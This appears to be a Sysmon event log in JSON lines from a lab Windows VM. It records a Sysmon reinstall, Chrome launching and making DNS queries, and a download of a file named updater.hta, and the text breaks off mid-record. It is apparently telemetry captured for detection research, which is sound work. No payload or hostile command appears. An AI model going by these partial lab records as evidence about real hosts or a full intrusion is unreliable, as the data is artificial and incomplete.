{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"Sysmon.exe  -u","Company":"Sysinternals - www.sysinternals.com","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\Sysmon\\","Description":"System activity monitor","FileVersion":"13.10","Hashes":"MD5=DE5291AAB5CE0F305B4882CF2324A320,SHA256=902B30F1A5510B7B72BAD794AF3614B487360553E6246F6358B6A64A57046800,IMPHASH=FCA4E789B7E426FECECA7AC808CCE473","Image":"C:\\Users\\IEUser\\Downloads\\Sysmon\\Sysmon.exe","IntegrityLevel":"High","LogonGuid":"747F3D96-DE82-6094-4A13-0F0000000000","LogonId":"0xf134a","OriginalFileName":"-","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\" ","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"747F3D96-21B0-6095-F102-000000001D00","ParentProcessId":5344,"ProcessGuid":"747F3D96-302C-6095-9704-000000001D00","ProcessId":1508,"Product":"Sysinternals Sysmon","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:18:52.262"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":1482,"Execution":{"#attributes":{"ProcessID":4804,"ThreadID":5500}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:18:52.399390Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:18:52.450","Image":"C:\\Users\\IEUser\\Downloads\\Sysmon\\Sysmon.exe","ProcessGuid":"747F3D96-302C-6095-9704-000000001D00","ProcessId":1508,"RuleName":"EXE","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\Sysmon.exe","UtcTime":"2021-05-07 12:18:52.450"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":1483,"Execution":{"#attributes":{"ProcessID":4804,"ThreadID":5500}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:18:52.462757Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"Sysmon.exe  -u","Company":"Sysinternals - www.sysinternals.com","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\Sysmon\\","Description":"System activity monitor","FileVersion":"13.10","Hashes":"MD5=6941190A798BB7C0846B5553270D2014,SHA256=4C81F0FAF42081ED34A2A2C30B3C2DD4110A7394C741BAA19DE6BAF5D46BF004,IMPHASH=3C34E34AF1762DF459C85DEB74B8C286","Image":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\Sysmon.exe","IntegrityLevel":"High","LogonGuid":"747F3D96-DE82-6094-4A13-0F0000000000","LogonId":"0xf134a","OriginalFileName":"-","ParentCommandLine":"Sysmon.exe  -u","ParentImage":"C:\\Users\\IEUser\\Downloads\\Sysmon\\Sysmon.exe","ParentProcessGuid":"747F3D96-302C-6095-9704-000000001D00","ParentProcessId":1508,"ProcessGuid":"747F3D96-302C-6095-9804-000000001D00","ProcessId":2084,"Product":"Sysinternals Sysmon","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:18:52.470"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":1484,"Execution":{"#attributes":{"ProcessID":4804,"ThreadID":5500}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:18:52.502224Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"SchemaVersion":"4.60","State":"Stopped","UtcTime":"2021-05-07 12:18:52.544","Version":"13.10"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":4,"EventRecordID":1485,"Execution":{"#attributes":{"ProcessID":4804,"ThreadID":6544}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":4,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:18:52.550312Z"}},"Version":3}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Configuration":"C:\\Users\\IEUser\\Downloads\\Sysmon\\sysmonconfig-export.xml","ConfigurationFileHash":"SHA256=EA5133261F8C5D31A30DD852A05B90E804103837310C14A69747BA8367D6CDB5","UtcTime":"2021-05-07 12:19:15.625"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":16,"EventRecordID":1486,"Execution":{"#attributes":{"ProcessID":4348,"ThreadID":6112}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-21-3461203602-4096304019-2269080069-1000"}},"Task":16,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:15.628835Z"}},"Version":3}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"SchemaVersion":"4.60","State":"Started","UtcTime":"2021-05-07 12:19:15.797","Version":"13.10"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":4,"EventRecordID":1487,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":4,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:15.802420Z"}},"Version":3}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\Windows\\Sysmon.exe","Company":"Sysinternals - www.sysinternals.com","CurrentDirectory":"C:\\Windows\\system32\\","Description":"System activity monitor","FileVersion":"13.10","Hashes":"MD5=6941190A798BB7C0846B5553270D2014,SHA256=4C81F0FAF42081ED34A2A2C30B3C2DD4110A7394C741BAA19DE6BAF5D46BF004,IMPHASH=3C34E34AF1762DF459C85DEB74B8C286","Image":"C:\\Windows\\Sysmon.exe","IntegrityLevel":"System","LogonGuid":"747F3D96-89A0-6095-E703-000000000000","LogonId":"0x3e7","OriginalFileName":"-","ParentCommandLine":"-","ParentImage":"-","ParentProcessGuid":"00000000-0000-0000-0000-000000000000","ParentProcessId":524,"ProcessGuid":"747F3D96-3043-6095-A204-000000001D00","ProcessId":4224,"Product":"Sysinternals Sysmon","RuleName":"-","TerminalSessionId":0,"User":"NT AUTHORITY\\SYSTEM","UtcTime":"2021-05-07 12:19:15.640"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":1488,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:15.819445Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\Windows\\system32\\wbem\\unsecapp.exe -Embedding","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Windows\\system32\\","Description":"Sink to receive asynchronous callbacks for WMI client application","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Hashes":"MD5=8B0E699F01BDD3B9AD741D1BD7343248,SHA256=8095D4D7726438F8665E00C1A405AB94DB6358DC14740783795CF8617A64F19E,IMPHASH=9E0E0DA3FF0E183298AEDC6F7ECB7E05","Image":"C:\\Windows\\System32\\wbem\\unsecapp.exe","IntegrityLevel":"System","LogonGuid":"747F3D96-89A0-6095-E703-000000000000","LogonId":"0x3e7","OriginalFileName":"unsecapp.dll","ParentCommandLine":"-","ParentImage":"-","ParentProcessGuid":"00000000-0000-0000-0000-000000000000","ParentProcessId":728,"ProcessGuid":"747F3D96-3043-6095-A304-000000001D00","ProcessId":6984,"Product":"Microsoft\u00ae Windows\u00ae Operating System","RuleName":"-","TerminalSessionId":0,"User":"NT AUTHORITY\\SYSTEM","UtcTime":"2021-05-07 12:19:15.707"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":1489,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:15.820087Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\Sysmon.exe","ProcessGuid":"747F3D96-3043-6095-9C04-000000001D00","ProcessId":4348,"RuleName":"-","UtcTime":"2021-05-07 12:19:16.703"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":5,"EventRecordID":1490,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":5,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:16.713355Z"}},"Version":3}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Users\\IEUser\\Downloads\\Sysmon\\Sysmon.exe","ProcessGuid":"747F3D96-3043-6095-9B04-000000001D00","ProcessId":4960,"RuleName":"-","UtcTime":"2021-05-07 12:19:16.719"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":5,"EventRecordID":1491,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":5,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:16.723433Z"}},"Version":3}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" ","Company":"Google LLC","CurrentDirectory":"C:\\Program Files\\Google\\Chrome\\Application\\","Description":"Google Chrome","FileVersion":"90.0.4430.93","Hashes":"MD5=CF62418A1AE72A86F66DB4DCCB3FCBD9,SHA256=96B04578BB30AC9EF4534C6FC1BBA943F6432B52BF693206936C325C9A722DDF,IMPHASH=891D2BAFA4260189E94CAC8FB19F369A","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"chrome.exe","ParentCommandLine":"C:\\Windows\\Explorer.EXE","ParentImage":"C:\\Windows\\explorer.exe","ParentProcessGuid":"747F3D96-DE84-6094-6800-000000001D00","ParentProcessId":2956,"ProcessGuid":"747F3D96-3057-6095-A504-000000001D00","ProcessId":2176,"Product":"Google Chrome","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:19:35.322"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":1492,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:35.361695Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\Windows\\System32\\CompPkgSrv.exe -Embedding","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Windows\\system32\\","Description":"Component Package Support Server","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Hashes":"MD5=1D81678C44DFA8582F01396CF1B5F7C0,SHA256=0E20CC2247BA919575AD71E08F40218D90825C2A207F4E5DF0479CA803F94890,IMPHASH=9C5365A9CDB8687F59320109F3CE439E","Image":"C:\\Windows\\System32\\CompPkgSrv.exe","IntegrityLevel":"Low","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"CompPkgSrv.exe","ParentCommandLine":"-","ParentImage":"-","ParentProcessGuid":"00000000-0000-0000-0000-000000000000","ParentProcessId":728,"ProcessGuid":"747F3D96-3058-6095-AD04-000000001D00","ProcessId":5652,"Product":"Microsoft\u00ae Windows\u00ae Operating System","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:19:36.919"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":1493,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:36.925986Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessGuid":"747F3D96-3057-6095-A804-000000001D00","ProcessId":6676,"QueryName":"accounts.google.com","QueryResults":"2404:6800:4007:810::200d;::ffff:142.250.182.141;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:19:37.911"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1494,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:38.535205Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessGuid":"747F3D96-3057-6095-A804-000000001D00","ProcessId":6676,"QueryName":"wpad","QueryResults":"::ffff:185.38.111.1;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:19:38.046"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1495,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:38.535260Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessGuid":"747F3D96-3057-6095-A804-000000001D00","ProcessId":6676,"QueryName":"www.google.com","QueryResults":"2404:6800:4002:804::2004;::ffff:172.217.160.132;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:19:38.328"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1496,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:38.535298Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\SystemApps\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\SearchUI.exe","ProcessGuid":"747F3D96-DE88-6094-6C00-000000001D00","ProcessId":3312,"QueryName":"fp-vs.azureedge.net","QueryResults":"type:  5 fp-vs.ec.azureedge.net;type:  5 cs9.wpc.v0cdn.net;2606:2800:147:120f:30c:1ba0:fc6:265a;::ffff:117.18.232.200;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:19:38.604"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1497,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:39.523475Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessGuid":"747F3D96-3057-6095-A804-000000001D00","ProcessId":6676,"QueryName":"az725175.vo.msecnd.net","QueryResults":"type:  5 cs22.wpc.v0cdn.net;::ffff:117.18.232.200;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:19:44.120"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1498,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:44.905533Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessGuid":"747F3D96-3057-6095-A804-000000001D00","ProcessId":6676,"QueryName":"outlook","QueryResults":"-","QueryStatus":"9003","RuleName":"-","UtcTime":"2021-05-07 12:19:44.539"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1499,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:44.905597Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessGuid":"747F3D96-3057-6095-A804-000000001D00","ProcessId":6676,"QueryName":"nndokdxockgxpi","QueryResults":"-","QueryStatus":"9003","RuleName":"-","UtcTime":"2021-05-07 12:19:45.554"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1500,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:45.910918Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessGuid":"747F3D96-3057-6095-A804-000000001D00","ProcessId":6676,"QueryName":"jotsmastogmufw","QueryResults":"-","QueryStatus":"9003","RuleName":"-","UtcTime":"2021-05-07 12:19:45.649"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1501,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:45.910944Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessGuid":"747F3D96-3057-6095-A804-000000001D00","ProcessId":6676,"QueryName":"xgaranenweeaka","QueryResults":"-","QueryStatus":"9003","RuleName":"-","UtcTime":"2021-05-07 12:19:45.650"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1502,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:19:45.910968Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:20:20.107","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessGuid":"747F3D96-3057-6095-A504-000000001D00","ProcessId":2176,"RuleName":"Downloads","TargetFilename":"C:\\Users\\IEUser\\Downloads\\de44892c-1f21-46f8-9c86-144844181950.tmp","UtcTime":"2021-05-07 12:20:20.107"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":1503,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:20.127241Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessGuid":"747F3D96-3057-6095-A804-000000001D00","ProcessId":6676,"QueryName":"sb-ssl.google.com","QueryResults":"type:  5 sb-ssl.l.google.com;2404:6800:4007:82b::200e;::ffff:142.250.195.174;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:20.346"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1504,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:21.279680Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Contents":"-","CreationUtcTime":"2021-05-07 12:20:20.107","Hash":"MD5=B1C9F01157759BA9E8679965E51A4AE1,SHA256=CE42A23936E4CEC5E222EC323BC4DBF462FD16E16C21E3C2995F86CF79106C80,IMPHASH=00000000000000000000000000000000","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessGuid":"747F3D96-3086-6095-CB04-000000001D00","ProcessId":3704,"RuleName":"-","TargetFilename":"C:\\Users\\IEUser\\Downloads\\updater.hta","UtcTime":"2021-05-07 12:20:23.218"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":15,"EventRecordID":1505,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":15,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:23.230067Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:20:20.107","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessGuid":"747F3D96-3086-6095-CB04-000000001D00","ProcessId":3704,"RuleName":"Downloads","TargetFilename":"C:\\Users\\IEUser\\Downloads\\updater.hta:Zone.Identifier","UtcTime":"2021-05-07 12:20:23.218"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":1506,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:23.230120Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Contents":"[ZoneTransfer]  ZoneId=3  ","CreationUtcTime":"2021-05-07 12:20:20.107","Hash":"MD5=FBCCF14D504B7B2DBCB5A5BDA75BD93B,SHA256=EACD09517CE90D34BA562171D15AC40D302F0E691B439F91BE1B6406E25F5913,IMPHASH=00000000000000000000000000000000","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessGuid":"747F3D96-3086-6095-CB04-000000001D00","ProcessId":3704,"RuleName":"-","TargetFilename":"C:\\Users\\IEUser\\Downloads\\updater.hta:Zone.Identifier","UtcTime":"2021-05-07 